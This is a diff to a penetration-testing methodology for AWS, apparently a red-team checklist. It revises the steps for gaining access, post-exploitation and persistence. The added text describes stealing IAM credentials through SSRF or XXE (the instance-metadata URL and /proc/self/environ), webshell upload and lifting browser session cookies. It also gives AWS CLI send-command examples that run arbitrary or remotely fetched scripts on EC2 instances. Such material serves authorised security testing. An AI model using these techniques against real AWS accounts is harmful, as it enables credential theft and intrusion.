@@ -1672,18 +1672,31 @@ Link - https://aws.amazon.com/pt/security/penetration-testing/
     + ...
 
   - STEP 2 - Gaining Access
-    + Find clear-text AWS credentials hardcoded in a config file, a script, or a log files stored in:
+    + Find clear-text AWS credentials hardcoded in a config file, a script, or log files stored in:
       + unprotected S3 buckets
       + unprotected Amazon Machine Images (AMIs) 
       + unprotected Github / Gitlab / JFrog repositories
       + ...
+        
     + Abuse an insecure AssumeRole trust policy
-      + Enumerate exposed ARNs from public sources (e.g., a role ARN could be leaked in code, GitHub, CI logs, web responses, etc.)
+      + Enumerate exposed ARNs from public sources (e.g., it could be leaked in code, GitHub, CI logs, Web responses, etc)
       + Test whether the target account’s trust policies allows us to assume it
-      + Observe whether AWS returns temporary credentials 
-    + Find and exploit a critical vulnerability on a Website hosted on a EC2 Windows or Linux VM  
-      then found AWS credentials hardcoded in a config file, a script, or a log files stored on the EC2 VM  
-      or try to collect AWS creds in the the Meta-data of the EC2 VM (http://169.254.169.254/latest/meta-data/iam/security-credentials/<xxx>)
+      + Observe whether AWS returns temporary credentials
+        
+    + Steal IAM Credentials and Event Data from Lambda
+      + In Lambda, IAM credentials are passed into the function via environment variables. The benefit for the adversary is that these credentials can be leaked via file read
+        vulnerabilities such as XML External Entity attacks or SSRF that allows the file protocol. This is because "everything is a file".
+      + IAM credentials can be accessed via reading /proc/self/environ.
+        
+    + Steal EC2 Metadata Credentials via SSRF
+      + If the EC2 instance is configured to use the default instance metadata service version 1, it is possible to steal IAM credentials from the instance without getting
+        code execution on it.
+      + This can be done by abusing existing applications running on the host. By exploiting common vulnerabilities such as server side request forgery (SSRF) or XML external
+        entity (XXE) flaws, an adversary can coerce an application running on the host to retrieve those IAM credentials.
+        (http://169.254.169.254/latest/meta-data/iam/security-credentials/<xxx>)
+    
+    + Find and exploit a critical vulnerability (e.g., webshell upload) on a Website hosted on a EC2 Windows or Linux VM  
+      then found AWS credentials hardcoded in a config file, a script, or log files stored on the EC2 VM  
     + ...
 
   - STEP 3 - Privilege Escalation
@@ -1693,10 +1706,11 @@ Link - https://aws.amazon.com/pt/security/penetration-testing/
       + ...
     
   - STEP 4 - Post-Exploitation
-    + After achieving privilege escalation, you may attempt to execute OS‑level commands and access EC2 VM instances along with the data they host.  
+    + Run Shell Commands on EC2 VMs with 'Send Command'
+      + After achieving privilege escalation, you may attempt to execute OS‑level commands and access EC2 VM instances along with the data they host.  
       ```
-      Example 1 (ssm:SendCommand & ssm:ListCommandInvocations)
-      --------------------------------------------------------
+      Example 1
+      ----------
       ✓ Send arbitrary shell commands to EC2 instances from the AWS CLI via the following:
       
         aws ssm send-command \
@@ -1713,8 +1727,8 @@ Link - https://aws.amazon.com/pt/security/penetration-testing/
         --details
       ```
       ```
-      Example 2 (AWS-RunRemoteScript)
-      --------------------------------
+      Example 2 
+      ----------
       ✓ It downloads from remote locations scripts and executes them. It supports S3 Buckets and GitHub repositories.
         It works for both UNIX and Windows machines.
 
@@ -1722,7 +1736,12 @@ Link - https://aws.amazon.com/pt/security/penetration-testing/
         --instance-id i-06ae9883fe6e5d721 \
         --parameters '{"sourceType":["S3"], "sourceInfo":["{\"path\":\"s3://my-bucket/script.sh\"}"]}'
       ```
-
+    + Abusing Elastic Container Registry for Lateral Movement
+    + Get IAM Credentials from a Console Session
+      + When performing a penetration test or red team assessment, it is not uncommon to gain access to a developer's machine.
+        This presents an opportunity for you to jump into AWS infrastructure via credentials on the system.
+        For a myriad of reasons you may not have access to credentials in the .aws folder, but instead have access to their browser's session cookies (for example via cookies.sqlite in FireFox).
+    + ...
   - STEP 5 - Persistence
     + Numerous persistence techniques exist:
       + Establish persistence using 'iam:CreateAccessKey', 'iam:CreateLoginProfile', 'iam:UpdateAssumeRolePolicy', etc.
